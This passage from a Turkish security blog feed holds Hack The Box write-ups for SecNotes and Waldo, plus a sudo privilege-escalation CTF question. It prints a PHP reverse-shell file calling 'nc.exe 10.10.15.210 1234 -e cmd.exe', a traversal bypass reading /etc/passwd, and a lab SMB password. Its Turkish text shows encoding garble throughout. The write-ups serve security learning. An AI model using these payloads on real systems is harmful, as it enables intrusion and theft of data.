<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-4.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-4-1024x423.png" alt="" class="wp-image-437"/></a><figcaption><br><br></figcaption></figure>



<p>Denemek amaÃ§lÄ± XSS varmÄ±dÄ±r diye merak ettim. Evet var ama bir iÅŸimize yaramaz buradaki XSS. Biz tekrar giriÅŸ sayfamÄ±za dÃ¶nelim.</p>



<p><em>Login</em> gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z an aklÄ±mÄ±za SQL Injection gelmesi gerekiyor. AmacÄ±mÄ±z tÃ¼m kayÄ±tlÄ± notlarÄ± gÃ¶rmek olacaÄŸÄ± iÃ§in bypass etmeye Ã§alÄ±ÅŸÄ±yorum. Ã‡ok da zor deÄŸilmiÅŸ atlatmasÄ±. </p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-5.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-5.png" alt="" class="wp-image-438"/></a><figcaption><br><br></figcaption></figure>



<p>Biraz SQL biliyorsanÄ±z yazdÄ±ÄŸÄ±mÄ± anlamÄ±ÅŸsÄ±nÄ±zdÄ±r. TÃ¼m kullanÄ±cÄ±larÄ±n notlarÄ±nÄ± gÃ¶rmemizi saÄŸlar. Sqli yapacaÄŸÄ±mÄ±z payload ile kayÄ±t olup giriÅŸ yapÄ±yoruz. </p>



<p><br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-6.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-6-1024x512.png" alt="" class="wp-image-439"/></a><figcaption><br><br></figcaption></figure>



<p>Ve tÃ¼m kayÄ±tlÄ± notlarÄ± gÃ¶rebiliyoruz. Notlardan birisi dikkatimi Ã§ekiyor. KullanÄ±cÄ± adÄ±, parola gibi deÄŸerlere benziyor. HatÄ±rlarsanÄ±z 445 (SMB) portu aÃ§Ä±ktÄ±. Oradan giriÅŸ yapmayÄ± deneyebiliriz</p>



<p><strong>KullanÄ±cÄ± AdÄ±     -&gt;   tyler <br>Parola                -&gt; 92g!mA8BGjOirkL%OG*&amp;<br>PaylaÅŸÄ±m            -&gt; new-site</strong><br> <strong><br></strong></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-7.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-7.png" alt="" class="wp-image-440"/></a><figcaption><br><br></figcaption></figure>



<p>BulduÄŸumuz deÄŸerler ve smbclient ile baÄŸlanÄ±yoruz. Ä°Ã§eride 2 dosya buluyoruz. Bu dosyalar 8808 portunda olan Ã§alÄ±ÅŸan dosyalar olduÄŸunu fark ediyoruz.</p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-18.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-18-1024x431.png" alt="" class="wp-image-441"/></a><figcaption><br><br></figcaption></figure>



<p>AnlÄ±yoruz ki buraya yÃ¼klediÄŸimiz dosyalarÄ± 8808 portunda aÃ§abiliriz. Hemen reverse shell almaya Ã§alÄ±ÅŸÄ±yoruz.</p>



<p>KullandÄ±ÄŸÄ±m php dosyasÄ± ÅŸu ÅŸekilde</p>



<pre class="wp-block-code"><code>&lt;?php 
echo shell_exec('nc.exe 10.10.15.210 1234 -e cmd.exe');
//CySecLab
//nc 192.168.100.113 4444 â€“e /bin/bash >>> For Linux Systems
//nc.exe 192.168.100.113 4444 â€“e cmd.exe  >>> For windows Systems
?></code></pre>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-8.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-8.png" alt="" class="wp-image-444"/></a><figcaption><br><br></figcaption></figure>



<p>Php dosyasÄ±  netcat&#8217;i kullanacaÄŸÄ± iÃ§in yanÄ±nda birde nc.exe programÄ±nÄ± yÃ¼klÃ¼yorum. Kendi terminalimden de 1234 portunuda dinlemeye alÄ±yorum ve tarayÄ±cÄ±da aÃ§Ä±yorum.</p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-9.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-9-1024x489.png" alt="" class="wp-image-445"/></a></figure>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-10.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-10.png" alt="" class="wp-image-446"/></a><figcaption><br><br></figcaption></figure>



<p>BaÄŸlantÄ±mÄ±zÄ± aldÄ±k ve<strong> user.txt</strong>&#8216;mizi okuduk. SÄ±radaki amacÄ±mÄ±z <strong>root.txt</strong>&#8216;i okumak.</p>



<p>Ã–ncelikle dizinleri inceliyorum. DeÄŸiÅŸik birÅŸeyler var mÄ± diye.</p>



<p><br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-11.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-11.png" alt="" class="wp-image-448"/></a><figcaption><br><br></figcaption></figure>



<p>Windows sunucu Ã¼zerinde daÄŸÄ±tÄ±m olarak ubuntu yÃ¼klÃ¼. Fark ettiyseniz internet sitesinde <strong> login.php register.php </strong>olmasÄ±nÄ±n nedeni buydu. Ve shell&#8217;imizi de php dosya kullanarak almÄ±ÅŸtÄ±k. EÄŸer ubuntu yÃ¼klÃ¼ ise bu daÄŸÄ±tÄ±mÄ±n iÃ§ine baÄŸlanabiliriz demektir. TÃ¼m dizinlerde <strong>bash</strong>, <strong>bash.exe</strong> gibi isimleri arattÄ±m ve buldum.</p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-12.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-12-1024x358.png" alt="" class="wp-image-449"/></a><figcaption><br><br></figcaption></figure>



<p>Dizini bulduktan sonra <strong>bash.exe&#8217;</strong>yi Ã§alÄ±ÅŸtÄ±rÄ±yorum ve makineye eriÅŸmiÅŸ oluyorum. Ã–ncelikle etkileÅŸimli shell almadan iÃ§imiz rahat etmez diyerek alÄ±yoruz.</p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-13.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-13.png" alt="" class="wp-image-450"/></a><figcaption><br><br></figcaption></figure>



<p>EtkileÅŸimli shell aldÄ±k ve root olarak baÄŸlanmÄ±ÅŸÄ±z.</p>



<p>Ama <strong>/root</strong> iÃ§inde <strong>root.txt</strong> yok <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f642.png" alt="ğŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /> </p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-14.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-14.png" alt="" class="wp-image-455"/></a><figcaption><br><br></figcaption></figure>



<p>Ã‡Ã¼nkÃ¼ bizden ubuntu iÃ§inde root olmamÄ±z istenmiyor. Windows iÃ§inde Administrator olmamÄ±z isteniyor. AramalarÄ±mÄ±za devam ediyoruz. Ä°lk Ã¶nce en sevdiÄŸim dosyanÄ±n iÃ§eriÄŸini inceliyoruz. <strong>.bash_history</strong> dosyasÄ±.</p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-15.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-15.png" alt="" class="wp-image-451"/></a><figcaption><br><br></figcaption></figure>



<p>DosyanÄ±n iÃ§eriÄŸinde gÃ¶zÃ¼kÃ¼yor ki administrator smbclient ile parolasÄ± aÃ§Ä±k bir ÅŸekilde baÄŸlanmÄ±ÅŸ. Bizde aynÄ± ÅŸekilde baÄŸlanÄ±yoruz.<br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-16.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-16-1024x341.png" alt="" class="wp-image-452"/></a><figcaption><br><br></figcaption></figure>



<p>AynÄ± ÅŸekilde baÄŸlandÄ±k ve root.txt&#8217;i Ã§ektik. </p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-17.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-17.png" alt="" class="wp-image-453"/></a><figcaption><br><br></figcaption></figure>



<p>Ubuntu makinesine Ã§ektiÄŸimiz root.txt&#8217;mizi okuduk ve makineyi tamamladÄ±k.</p>



<p>OkuduÄŸunuz iÃ§in teÅŸekkÃ¼rler. YazÄ±larÄ±mda herhangi bir teknik hata varsa bildirmekten Ã§ekinmeyinizâ€¦</p>
]]></content:encoded>
					
					<wfw:commentRss>https://ridvankaplan.github.io/hack-the-box/secnotes-hack-the-box.html/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Yetki YÃ¼kseltme CTF Sorusu</title>
		<link>https://ridvankaplan.github.io/linux/yetki-yukseltme-ctf-sorusu.html</link>
					<comments>https://ridvankaplan.github.io/linux/yetki-yukseltme-ctf-sorusu.html#respond</comments>
		
		<dc:creator><![CDATA[RÄ±dvan Kaplan]]></dc:creator>
		<pubDate>Mon, 07 Jan 2019 10:53:20 +0000</pubDate>
				<category><![CDATA[CTF]]></category>
		<category><![CDATA[Linux]]></category>
		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=463</guid>

					<description><![CDATA[Merhaba !!! GeÃ§en haftalarda 3 arkadaÅŸÄ±mla birlikte katÄ±ldÄ±ÄŸÄ±mÄ±z bir CTF&#8217;te geÃ§en bir sorunun Ã§Ã¶zÃ¼mÃ¼nÃ¼ ve nasÄ±l hazÄ±rlandÄ±ÄŸÄ±nÄ± paylaÅŸacaÄŸÄ±m. Ã–ncelikle CTF&#8217;te hedef makineye eriÅŸip ve yetki&#8230;]]></description>
										<content:encoded><![CDATA[
<p>Merhaba !!!</p>



<p>GeÃ§en haftalarda 3 arkadaÅŸÄ±mla birlikte katÄ±ldÄ±ÄŸÄ±mÄ±z bir CTF&#8217;te geÃ§en bir sorunun Ã§Ã¶zÃ¼mÃ¼nÃ¼ ve nasÄ±l hazÄ±rlandÄ±ÄŸÄ±nÄ± paylaÅŸacaÄŸÄ±m.</p>



<span id="more-463"></span>



<p>Ã–ncelikle CTF&#8217;te hedef makineye eriÅŸip ve yetki yÃ¼kselttikten sonra tÃ¼m sorularÄ± gÃ¶rebiliyorduk. Sorular internet ortamÄ±nda yayÄ±nlanmadÄ±ÄŸÄ± iÃ§in aklÄ±mda kalan bu soruyu paylaÅŸÄ±yorum. Ã‡ok kolay bir soruydu. Hedef makineden shell aldÄ±ktan sonra root olmamÄ±z gerekiyordu.</p>



<p>Ã–ncelikle<strong> sudo -l</strong> komutuyla ayrÄ±calÄ±klÄ± dosyalara bakmak istedim ve aÅŸaÄŸÄ±daki gibi bir Ã§Ä±ktÄ± gÃ¶rdÃ¼m.</p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-1.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-1-1024x152.png" alt="" class="wp-image-464"/></a></figure>



<p>MasaÃ¼stÃ¼ndeki bir dosyanÄ±n root haklarÄ±yla ama parola gerekmeksizin Ã§alÄ±ÅŸtÄ±rabiliyordu. BirkaÃ§ yolla root olabilirdiniz. Ã–rneÄŸin bu dosya bash dosyasÄ± olduÄŸu iÃ§in etkileÅŸimli shell almak iÃ§in kullanÄ±lan python scriptini dosyanÄ±n iÃ§eriÄŸine yazÄ±p Ã§alÄ±ÅŸtÄ±rarak.</p>



<p><br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-2.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-2.png" alt="" class="wp-image-465"/></a></figure>



<p>DiÄŸer bir Ã¶rnek ise <strong>symlink</strong> kullanarak root olunabilir.</p>



<p>Ã–ncelikle masaÃ¼stÃ¼ndeki dosya silinir. Ã‡Ã¼nkÃ¼ aynÄ± isimde dosya olduÄŸunda symlink veremezsiniz. <strong>/bin/bash</strong> yoluna symlink verilir ve <strong>sudo</strong> komutu ile Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r.</p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-3.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-3.png" alt="" class="wp-image-466"/></a><figcaption><br></figcaption></figure>



<p>DeÄŸiÅŸiklik olmasÄ± amacÄ±yla ek olarak bu sorunun nasÄ±l dÃ¼zenlendiÄŸini paylaÅŸacaÄŸÄ±m. <strong>sudo </strong>komutunun yetkileriyle alakalÄ± dÃ¼zenlemeler <strong>/etc/sudoers</strong> dosyasÄ±ndan yapÄ±lÄ±r.<br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-4.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-4-1024x595.png" alt="" class="wp-image-468"/></a></figure>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-6.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-6-1024x166.png" alt="" class="wp-image-469"/></a><figcaption><br><br></figcaption></figure>



<p>VarsayÄ±lan olarak gelen <strong>sudoers</strong> dosyasÄ± ve komutununda Ã§Ä±ktÄ±sÄ± ekran gÃ¶rÃ¼ntÃ¼lerindeki gibidir</p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-5.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-5.png" alt="" class="wp-image-467"/></a><figcaption><br><br></figcaption></figure>



<p>AyrÄ±calÄ±klÄ± dosyayÄ± eklemek iÃ§in <strong>/etc/sudoers </strong>iÃ§ine en altta eklediÄŸim gibi ekleyerek verilen dosyanÄ±n root yetkileriyle ama herhangi bir parolaya ihtiyacÄ± olmadan Ã§alÄ±ÅŸtÄ±rmasÄ±na izin verir. DÃ¼zenlediÄŸimiz sudoers dosyasÄ±nÄ±n Ã§Ä±ktÄ±sÄ±da CTF sorumuz oluyor.</p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-1-1.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/01/CTF-1-1-1024x152.png" alt="" class="wp-image-470"/></a><figcaption><br><br></figcaption></figure>



<p>OkuduÄŸunuz iÃ§in teÅŸekkÃ¼rler. YazÄ±larÄ±mda herhangi bir teknik hata varsa bildirmekten Ã§ekinmeyinizâ€¦</p>
]]></content:encoded>
					
					<wfw:commentRss>https://ridvankaplan.github.io/linux/yetki-yukseltme-ctf-sorusu.html/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Waldo &#8211; Hack The Box</title>
		<link>https://ridvankaplan.github.io/hack-the-box/waldo-hack-the-box.html</link>
					<comments>https://ridvankaplan.github.io/hack-the-box/waldo-hack-the-box.html#respond</comments>
		
		<dc:creator><![CDATA[RÄ±dvan Kaplan]]></dc:creator>
		<pubDate>Sun, 16 Dec 2018 08:24:06 +0000</pubDate>
				<category><![CDATA[CTF]]></category>
		<category><![CDATA[Hack The Box]]></category>
		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=398</guid>

					<description><![CDATA[Merhaba !!! Åimdi Hack The Box iÃ§erisinde yeni emekliye ayrÄ±lmÄ±ÅŸ Waldo makinesinin Ã§Ã¶zÃ¼mÃ¼nÃ¼ paylaÅŸacaÄŸÄ±m. Ã–ncelikle nmap taramasÄ±yla port durumlarÄ±nÄ± inceleyelim. SSH servisi ve HTTP servisi&#8230;]]></description>
										<content:encoded><![CDATA[
<p>Merhaba !!!</p>



<p>Åimdi Hack The Box iÃ§erisinde yeni emekliye ayrÄ±lmÄ±ÅŸ Waldo makinesinin Ã§Ã¶zÃ¼mÃ¼nÃ¼ paylaÅŸacaÄŸÄ±m.</p>



<span id="more-398"></span>



<p>Ã–ncelikle nmap taramasÄ±yla port durumlarÄ±nÄ± inceleyelim.</p>



<p><br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-1.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-1.png" alt="" class="wp-image-399"/></a><figcaption><br><br></figcaption></figure>



<p>SSH servisi ve HTTP servisi Ã§alÄ±ÅŸÄ±yormuÅŸ. BÃ¼yÃ¼k ihtimal web tarafÄ±ndan birÅŸeyler yaparak ssh ile baÄŸlanmamÄ±zÄ± istiyor. Web sayfasÄ±nÄ± inceleyelim.</p>



<p> </p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-2.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-2-1024x518.png" alt="" class="wp-image-400"/></a><figcaption><br><br></figcaption></figure>



<p></p>



<p>Bir html sayfasÄ± geldi. Liste yÃ¶netimi adÄ±nda bir sayfa. Liste ekleyebiliyoruz silebiliyoruz listeleyebiliyoruz. Buradan bÃ¶yle birÅŸey Ã§Ä±kmayacak gibi duruyor. Birde proxy ile inceleyelim. Burp suite ile biraz daha inceleyelim. Burp suite iÃ§in kÃ¼Ã§Ã¼k bir ayar gerekiyor.</p>



<p><br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-3.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-3.png" alt="" class="wp-image-401"/></a><figcaption><br><br></figcaption></figure>



<p></p>



<p>AyarÄ±mÄ±zÄ± yaptÄ±ktan sonra liste ekleme silme ve listeleme iÅŸlemlerini yapÄ±p iÃ§eriklerini inceliyorum.</p>



<p><br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-4.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-4-1024x273.png" alt="" class="wp-image-402"/></a><figcaption><br><br></figcaption></figure>



<p>Liste eklemede <strong>fileWrite.php&nbsp;</strong> dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±yor. Numara ve iÃ§eriÄŸini alÄ±yor. Ben deneme amaÃ§lÄ± Ridvan yazdÄ±m ve numarasÄ±nÄ± 34 yaptÄ±m. YazÄ±ldÄ±ÄŸÄ±na dair true deÄŸerini dÃ¶ndÃ¼rdÃ¼. Birde bunu okuyalÄ±m. Okumak iÃ§in ise <strong>fileRead.php</strong> dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±yor. <br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-5.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-5-1024x277.png" alt="" class="wp-image-403"/></a><figcaption><br><br></figcaption></figure>



<p>DosyamÄ±zÄ± okuduk. Peki biz bunu nasÄ±l kendi amacÄ±mÄ±z iÃ§in kullanabiliriz ? Mesela buradan sunucuya ait dosyalar okuyabilir miyiz diye aklÄ±mÄ±za gelmesi gerekiyor. Birde <strong>dirRead.php </strong>dosyasÄ± var. O anki dizinde neler olduÄŸunu listelemek iÃ§in. En Ã¼st dizinde neler varmÄ±ÅŸ bakalÄ±m.<br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-6.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-6-1024x182.png" alt="" class="wp-image-404"/></a><figcaption><br><br></figcaption></figure>



<p>Mesela <strong>fileRead.php</strong> varmÄ±ÅŸ. Bu dosyanÄ±n iÃ§eriÄŸine bakalÄ±m. </p>



<p><br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-7.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-7-1024x200.png" alt="" class="wp-image-405"/></a><figcaption><br><br></figcaption></figure>



<p>Evet kaynak kodlarÄ±nÄ± gÃ¶rebiliyoruz. Buradan biraz karmaÅŸÄ±k olduÄŸu iÃ§in biraz dÃ¼zenledim. </p>



<p><br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-8.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-8-1024x770.png" alt="" class="wp-image-406"/></a><figcaption><br><br></figcaption></figure>



<p>Biraz php kodu okuyabiliyorsanÄ±z rahatlÄ±kla olayÄ± anlÄ±yorsunuzdur. Bu koddaki tek sorun gÃ¶nderilen dosya ismini deÄŸiÅŸtiriyor ( str_replace kÄ±smÄ± ) olmasÄ±. Ä°ki tane nokta ve / iÅŸareti yanyana olduÄŸunda farklÄ± karakterle deÄŸiÅŸtiriyor. Bunu ÅŸu ÅŸekilde atlattÄ±m. </p>



<p><strong>&#8230;.//&#8230;.//&#8230;.//etc/passwd </strong>ÅŸekilde. <br></p>



<p><br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-9.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-9-1024x257.png" alt="" class="wp-image-407"/></a><figcaption><br><br></figcaption></figure>



<p>Evet /etc/passwd iÃ§eriÄŸini okuduk. HatÄ±rlarsanÄ±z SSH portu aÃ§Ä±ktÄ±. Uzaktan baÄŸlanabilmek iÃ§in rsa keyi var mÄ± yok mu bakalÄ±m. Home iÃ§erisindeki kullanÄ±cÄ±nÄ±n ismi nobody. Ama birkaÃ§ deneme yapÄ±nca .ssh iÃ§indeki key&#8217;in ismini bulamadÄ±m. AklÄ±ma <strong>dirRead.php</strong> ile bakmak geldi. AynÄ± ÅŸekilde Ã§ift .. ve Ã§ift / iÅŸareti kullanÄ±nca onuda atlattÄ±m<br></p>



<p><br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-12.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-12-1024x187.png" alt="" class="wp-image-409"/></a><figcaption><br><br></figcaption></figure>



<p>DosyamÄ±zÄ±n ismi .monitor. Ve iÃ§eriÄŸini okuyoruz.<br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-10.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-10-1024x280.png" alt="" class="wp-image-408"/></a><figcaption><br><br></figcaption></figure>



<p></p>



<p>Keyimize ulaÅŸtÄ±k ve ssh ile baÄŸlanalÄ±m.</p>



<p><br></p>



<figure class="wp-block-image is-resized"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-11.png"><img decoding="async" loading="lazy" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-11.png" alt="" class="wp-image-410" width="580" height="171"/></a><figcaption><br></figcaption></figure>



<p>BaÄŸlandÄ±k ve <strong>user.txt</strong> mizi okuduk.</p>



<p>KullanÄ±cÄ±yÄ± ele geÃ§irdikten sonra sÄ±radaki amacÄ±mÄ±z root kullanÄ±cÄ±sÄ± olmak. Dizinleri incelerken <strong>.ssh </strong>iÃ§erisinde ki dosyada farklÄ± bir kullanÄ±cÄ±ylada ssh ile baÄŸlanabildiÄŸimi gÃ¶rdÃ¼m.<br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-13.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-13-1024x324.png" alt="" class="wp-image-421"/></a><figcaption><br><br></figcaption></figure>



<p>Ssh ile baÄŸlandÄ±m ve karÅŸÄ±ma bir docker Ã§Ä±ktÄ±. Ama bu makinede komutlarÄ± Ã§alÄ±ÅŸtÄ±ramÄ±yordum. Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ndeki gibi komut bulunamadÄ± hatasÄ± aldÄ±m.<br></p>



<p><br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-14.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-14.png" alt="" class="wp-image-422"/></a><figcaption><br><br></figcaption></figure>



<p>Bunu atlatabilmek iÃ§in internette biraz araÅŸtÄ±rma yaptÄ±m ve karÅŸÄ±ma <em><strong>&#8211;noprofile </strong></em>ve<strong> &#8211;norc </strong>komutlarÄ± karÅŸÄ±ma Ã§Ä±ktÄ±.<br></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-15.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-15.png" alt="" class="wp-image-423"/></a><figcaption><br><br></figcaption></figure>



<p>Monitor kullanÄ±cÄ±sÄ± olarak normal shell&#8217;e sahibiz. Bundan sonra biraz daha araÅŸtÄ±rÄ±yoruz ve ilginÃ§ birÅŸeyler bulmaya Ã§alÄ±ÅŸÄ±yoruz.</p>



<p>Ve <strong>/sbin/getcap </strong>te deÄŸiÅŸik birÅŸeyler olduÄŸunu buldum. NasÄ±l buldunuz derseniz sunucuda ne varsa araÅŸtÄ±rÄ±yorsunuz. 5 dakika iÃ§erisinde bulmuÅŸ deÄŸilim. Uzun bir sÃ¼re inceleme yapmÄ±ÅŸtÄ±m.</p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-16.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-16.png" alt="" class="wp-image-424"/></a><figcaption><br><br></figcaption></figure>



<p><a rel="noreferrer noopener" aria-label="Getcap dosyalarÄ±n yeteneklerini inceler. 
 (yeni sekmede aÃ§Ä±lÄ±r)" href="http://man7.org/linux/man-pages/man8/getcap.8.html" target="_blank">Getcap</a> dosyalarÄ±n yeteneklerini inceler. </p>



<p>-r parametresi ile / (kÃ¶k dizini) altÄ±nda&nbsp; yinemeli arama yapar. Yetki hatalarÄ±nÄ± ekrana bastÄ±rmamasÄ± iÃ§inde<strong> 2&gt;/dev/null i</strong>le gÃ¶stermez. </p>



<p>2 sonuÃ§ Ã§Ä±ktÄ±. tac komutu cat komutunun aynÄ±sÄ± tek farkÄ± dosyayÄ± son satÄ±rdan okumaya baÅŸlar. Ã–rnekteki gibi.<br></p>



<p></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-18.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-18-1024x650.png" alt="" class="wp-image-425"/></a><figcaption><br><br></figcaption></figure>



<p><a rel="noreferrer noopener" aria-label="cap_dac_read_search+ei&nbsp;&nbsp; ise isminde de anlaÅŸÄ±lacaÄŸÄ± Ã¼zere okuma iÅŸlemi iÃ§in tam yetkisi vardÄ±r anlamÄ± taÅŸÄ±yor diyebiliriz. (yeni sekmede aÃ§Ä±lÄ±r)" href="https://www.insecure.ws/linux/getcap_setcap.html" target="_blank">cap_dac_read_search+ei</a>&nbsp;&nbsp; ise isminde de anlaÅŸÄ±lacaÄŸÄ± Ã¼zere okuma iÅŸlemi iÃ§in tam yetkisi vardÄ±r anlamÄ± taÅŸÄ±yor diyebiliriz.</p>



<p>Yani anlaÅŸÄ±lacaÄŸÄ± Ã¼zere ikisini birleÅŸtirdiÄŸimizde tac ile root yetkilerinde ki dosyalarÄ± okuyabiliriz.</p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-17.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Waldo-17.png" alt="" class="wp-image-426"/></a><figcaption><br><br></figcaption></figure>



<p>Ve root yetkisiyle okunabilen root.txt&#8217;mizi de okuduk. </p>



<p> OkuduÄŸunuz iÃ§in teÅŸekkÃ¼rler. YazÄ±larÄ±mda herhangi bir teknik hata varsa bildirmekten Ã§ekinmeyinizâ€¦</p>



<p>Gereksiz Bilgi : Bu makineyi aktif olduÄŸu 2. veya 3. haftasÄ±nda Ã§Ã¶zmÃ¼ÅŸtÃ¼m. Direkt root shell&#8217;i almaya Ã§alÄ±ÅŸmÄ±ÅŸtÄ±m ama alamamÄ±ÅŸtÄ±m.<br></p>
]]></content:encoded>
					
					<wfw:commentRss>https://ridvankaplan.github.io/hack-the-box/waldo-hack-the-box.html/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Active &#8211; Hack The Box</title>
		<link>https://ridvankaplan.github.io/hack-the-box/active-hack-the-box.html</link>
